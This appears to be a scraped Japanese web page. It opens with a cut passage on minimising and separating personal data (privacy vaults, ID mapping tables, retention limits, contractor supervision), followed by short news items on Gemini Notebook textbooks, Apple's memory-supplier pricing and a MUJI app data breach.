IDaaSに置かない住所や電話番号は、個人情報を預かる専用のサービスに置く方法もあります。データプライバシーボルトと呼ばれるもので、Skyflowなどが提供しています。自社のDBには預けたときに受け取るトークンだけを持ち、表示するときにだけ元の値に戻す形で、決済サービスのトークンの考え方をカード以外の個人情報に広げたものです。IDaaSと違い、項目ごとに見られる人を絞ったり、一部を伏せて返したり、誰がいつ見たかを記録したりすることに向いていて、海外では金融や医療のように重い情報を扱う分野で使われているようです。ただ、表示のたびに元の値に戻す通信が必要になり、住所で検索するような処理も自社のDBだけではできなくなります。自社はトークンから元の値を取り出せるので、トークンとひも付いた利用履歴が個人情報のままである点は、subと変わりません。
自社に残るもの
外部サービスのIDや利用履歴のように、サービスそのものに関わるデータは、外部に出しようがありません。こうしたデータは、量を減らすことと、ほかのデータと切り離して持つことで守りやすくなります。
外部サービスのID
IDaaSのsubや決済サービスの顧客IDは、自社のデータとひも付けるためのキーなので、必ず自社のDBに残ります。このIDそのものはなくせないので、外部サービスのIDと自社の内部IDの対応表を別に持ち、利用履歴などのテーブルには内部IDだけを持たせる方法があります。対応表を守れていれば、ほかのテーブルが漏れても、外部サービスの情報とひも付けにくくなります。
利用履歴
利用履歴を外部に出すことはできないので、持つ量を減らすことを考えます。カラムを追加する前にこのデータがないと何が困るかを考えたり、年齢確認だけが目的なら生年月日の代わりに20歳以上かどうかのフラグだけを持ったりするように、持たない、粒度を落とす、という選択肢があります。
あわせて、持つ期間を決めて自動で消すようにしておくと、古いデータが残り続けずに済みます。行ごと消すほかに、行は残して個人を特定できる列だけを空にする方法もあり、この方法なら売上の集計などに使う列は残せます。
任せたあとも残る責任
外部サービスに任せても、預けた情報についての責任がなくなるわけではありません。
委託先の監督
個人情報保護法では、個人情報の取り扱いを外部に委託した場合、委託元が委託先を監督する必要があると定められています。IDaaSや決済サービスにユーザーの情報を預けている場合は、この委託にあたることが多いようです。
とはいえ、外部のサービスに自社が立ち入って確認するのは現実的ではありません。サービスを選ぶときに、SOC 2やISO/IEC 27001のような第三者の認証を取っているか、データをどこに保管しているか、事故が起きたときにどう連絡がくるかを確認しておくのが、実際の対応にな

Share
Gemini Notebook、無料で数百冊の教科書にアクセス可能に 米国・インドの出版社提供 日本でも利用可
公開


数百冊の教科書に「Gemini Notebook」内で無料でアクセスできるように――米Googleは10月29日（現地時間）、このような新機能を発表した。ユーザーは米国とインドのプロバイダーが提供する教科書をGemini Notebookの「ソース」として追加できるようになる。ITmedia AI＋編集部の環境で確認したところ、日本からも利用できた。
今回、Gemini Notebookでアクセスできるようになるのは、米国でオープンライセンスの教科書を出版するOpenStaxやOpen Textbook Library、インドの出版社S Chand Publishingなどが提供する数百冊の教科書。コンピュータサイエンスやビジネス、人文科学、数学、医学などさまざまな分野の教科書を選択できる。
教科書をソースに追加することで、その内容に基づいた質問回答や、練習問題、フラッシュカードなどの作成が可能になる。
Googleは8月、Gemini Notebookのソースに「Google Play」で購入した書籍を追加できる機能「Expert Intelligence」を発表しており、今回の発表はその拡張版と位置付けられている。

AppleはiPhoneをエサにメモリメーカーへ大幅な値引きを強要してきたがAIの登場で価格が高騰して立場が逆転しているとの指摘

📄 本文を読む
AppleはiPhoneをエサにメモリメーカーへ大幅な値引きを強要してきたがAIの登場で価格が高騰して立場が逆転しているとの指摘
以前はAppleに安く買いたたかれていたメモリ製品をめぐる状況が、AIの登場でガラッと変わってしまったとウォール・ストリート・ジャーナルが報じています。
The Beleaguered Chip Sellers Getting Their Revenge on Apple - WSJ
https://www.wsj.com/tech/apple-iphone-memory-chips-ai-c0084cc9
Appleは「iPod」で東芝のHDDを採用し、その後東芝のフラッシュメモリを使用したスマートフォン「iPhone」を発売して家電業界に革命をもたらしました。iPhoneが爆発的に普及するにつれ、Appleは東芝を含め複数社の同製品を買いあさり、世界のフラッシュメモリ供給量の5分の1以上を確保するようになったとのこと。
ウォール・ストリート・ジャーナルは、Appleに「約束を避ける」という強硬な戦術があったと報じています。それは、フラッシュメモリを破格の安値で発注した後、市場価格が下落すると注文をキャンセルするといった戦術でした。サプライヤーはApple向けに特注したものも含めて在庫を抱えることになるため、多くの場合は価格を引き下げてAppleに納品したそうです。
この戦術の立案者が、Appleの部品調達責任者だったトニー・ブレヴィンス氏だとウォール・ストリート・ジャーナルは指摘。同氏は競合する企業の営業チーム同士が偶然出くわすように仕向け、複数社との会議を連続して設定することで競争意識を高めたり、サプライヤーから帳簿を監査する権限をもらって他の購入者がAppleより低い価格でフラッシュメモリを買えないよう管理したりしていたとのこと。
ただ、サプライヤー側も優位に立とうと試みていて、例えばサンディスクは2015年にAppleからの追加供給要請を拒否したそうです。このときはブレヴィンス氏がサンディスクの営業担当者を脅迫したとウォール・ストリート・ジャーナルは報じています。ウエスタンデジタルは2017年、Appleに対して注文を確約しない販売に手数料を求めたともウォール・ストリート・ジャーナルは伝えています。
ブレヴィンス氏は2022年に退社していますが、その後メモリ市場は大きく変化しました。コロナ禍による在宅勤務ブームが落ち着いた2023年にはフラッシュメモリの価格が大きく落ち込みましたが、その後AIブームで価格が急騰。サプライヤーは、Appleに対して高い価格を要求する交渉力を手に入れたため、関係者いわく「サプライヤーの営業担当者たちはAppleが痛い目に遭ったことを密かに喜んでいた」とのこと。
調査企業TechInsightsの推計によると、Appleは2026年、前年に購入したものとほぼ同量のフラッシュメモリを購入するために4倍の金額を費やすと予想されているとのこと。Appleのティム・クック執行会長はメモリ価格の急騰を「100年に1度の洪水」に例えました。
TechInsightsのアナリストであるウォルト・クーン氏は「Appleは歴史的に、メモリサプライヤーに対して非常に厳しい価格交渉を行ってきました。そして今、力関係が変化していることに満足しているサプライヤーは少なくありません」と述べたそうです。

無印良品、「MUJIアプリ」の利用者情報最大約2726万件が不正アクセスにより流出の可能性　
10/30 06:32 · 🔖 255
📄 本文を読む
良品計画株式会社は10月30日、無印良品の公式アプリ「MUJIアプリ」において、利用者の情報の一部が外部に流出した可能性があることを確認したとして、情報を公開した。
　原因、経緯などの詳細は明らかにされていないが、外部からの不正なアクセスを検知し、アクセスの遮断および修正の適用を行ったとしている。
　流出の可能性がある情報は最大2726万件（退会者の情報も含む）の、メールアドレス、生年月日、性別。クレジットカード情報および、氏名、住所、電話番号などは含まれないとしている。
　同社では、当該の利用者に順次個別に連絡するとしている。なお、MUJIアプリや無印良品ネットストアは正常に利用できる状態。

GitHub Actions の lockfile対応 - 利用者と提供者両方の観点から | おそらくはそれさえも平凡な日々
